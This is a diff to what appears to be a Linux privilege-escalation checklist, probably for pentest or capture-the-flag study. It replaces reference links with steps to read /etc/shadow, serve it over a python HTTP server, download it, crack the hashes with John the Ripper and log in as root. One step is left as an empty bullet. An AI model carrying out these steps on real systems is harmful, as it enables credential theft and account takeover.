@@ -12,12 +12,15 @@ Privilege Escalation is the process of gaining higher-level permissions or privi
 2. **Check if Shadow File is Readable:**
    - Checking if the `/etc/shadow` file is readable to obtain hashed user passwords.
    - Example: `cat /etc/shadow`
-   - Online Resource: [https://book.hacktricks.xyz/linux-unix/privilege-escalation#passwords-inetcshadow](https://book.hacktricks.xyz/linux-unix/privilege-escalation#passwords-inetcshadow)
+   - Download shadow file to your local machine by copying the shadow file to `/tmp` and starting a python server `python -m http.server <port_number>`
+   - On your local machine, go to `http://<vulnerable-machine-ip>:<port_number>/<shadow-file>`
+   - On your local machine, use John The Ripper to crack shadow file hashes: `john --wordlist=<path-to-wordlist> <shadow_file>`
+   - Use the cracked password to login to user/root accounts on the vulnerable machine.
 
 3. **Check if Passwd and Shadow Files are Writable:**
    - Checking if the `/etc/passwd` and `/etc/shadow` files are writable to modify user accounts or credentials.
    - Example: `ls -l /etc/passwd /etc/shadow`
-   - Online Resource: [https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-etc-passwd](https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-etc-passwd)
+   - 
 
 4. **Check for SUID/SGID Bits Enabled Files:**
    - Identifying files with SUID (Set User ID) or SGID (Set Group ID) permissions that can be leveraged to escalate privileges.
